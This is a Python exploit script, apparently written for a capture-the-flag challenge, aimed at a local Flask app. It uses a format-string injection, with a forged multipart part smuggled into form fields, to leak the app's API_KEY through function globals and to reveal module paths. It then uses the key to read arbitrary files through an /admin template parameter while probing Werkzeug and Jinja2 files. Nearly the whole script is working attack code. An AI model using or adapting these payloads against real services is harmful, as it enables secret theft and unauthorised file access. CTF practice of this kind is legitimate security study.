import httpx
import re

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=10.0)
        return r.text, r.status_code
    except Exception as e:
        return str(e), 0

def debug_format(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = payload + fake_action_part
    if len(text) > 300:
        return None
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    try:
        r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
        return r.text
    except:
        return None

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 获取 Python 包路径
    result = debug_format("{0.view_functions[action].__globals__[httpx].__file__}")
    print(f"[*] httpx path: {result}")
    
    # 尝试找 Jinja2 的测试模板
    jinja2_path = debug_format("{0.jinja_env.__class__.__module__}")
    print(f"[*] jinja2 module: {jinja2_path}")
    
    flask_path = debug_format("{0.__class__.__module__}")
    print(f"[*] flask module: {flask_path}")
    
    # 可能存在测试模板的路径
    test_paths = [
        "/usr/local/lib/python3.13/site-packages/jinja2/templates/",
        "/usr/local/lib/python3.13/site-packages/flask/templates/",
        "/usr/local/lib/python3.13/site-packages/werkzeug/templates/",
    ]
    
    for path in test_paths:
        content, code = read_file_via_admin(api_key, path)
        if code != 404:
            print(f"[*] {path}: status={code}")
    
    # 检查 werkzeug debug 模板
    print("\n[*] Checking Werkzeug debug templates...")
    content, code = read_file_via_admin(api_key, "/usr/local/lib/python3.13/site-packages/werkzeug/debug/templates/")
    print(f"Status: {code}")
    
    # 直接读取 werkzeug 的 shared 目录下可能存在的 html
    paths = [
        "/usr/local/lib/python3.13/site-packages/werkzeug/debug/shared/debugger.js",
        "/usr/local/lib/python3.13/site-packages/werkzeug/debug/shared/style.css",
    ]
    for p in paths:
        content, code = read_file_via_admin(api_key, p)
        if code == 200:
            print(f"[+] Found: {p}")
            # 检查是否有 {{ }}
            if '{{' in content:
                print(f"[!] Contains Jinja2 syntax!")
